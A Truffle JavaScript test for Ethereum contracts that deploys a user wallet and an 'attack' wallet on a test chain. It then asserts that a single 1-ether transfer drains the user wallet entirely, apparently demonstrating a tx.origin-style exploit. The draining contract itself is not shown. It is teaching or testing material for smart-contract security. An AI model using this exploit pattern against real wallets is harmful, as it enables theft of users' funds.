var TxUserWallet = artifacts.require("./TxUserWallet.sol");
var TxAttackWallet = artifacts.require("./TxAttackWallet.sol");

Promise = require("bluebird");
Promise.promisifyAll(web3.eth, { suffix: "Promise" });

contract('attack', function (accounts) {
  var userAcc = accounts[0];
  var attackerAcc = accounts[1];
  var userWallet, attackWallet;

  function getBalances() {
    return Promise.all([userWallet.contract.address, attackWallet.contract.address, userAcc, attackerAcc].map(
      acc => web3.eth.getBalancePromise(acc).then(bal => web3.fromWei(bal, 'ether').toString(10))));
  }

  before("should deploy", function () {
    return TxUserWallet.new({ value: web3.toWei(9, 'ether'), from: userAcc }).then(instance => {
      userWallet = instance;
      return TxAttackWallet.new({ from: attackerAcc }).then(instance => attackWallet = instance);
    }).then(instance => {
      attackWallet = instance;
    });
  });

  it("should drain", function () {
    return getBalances().then(balances => {
      console.log(balances);

      return userWallet.transferTo(attackWallet.contract.address, web3.toWei(1, 'ether'), { from: userAcc });

    }).then(txObj => {
      return getBalances().then(balances => {
        console.log(balances);

        return web3.eth.getBalancePromise(userWallet.contract.address).then(userBal => {
          assert.strictEqual(userBal.toString(10), '0', 'not drained');
        })
      });
    });
  });
});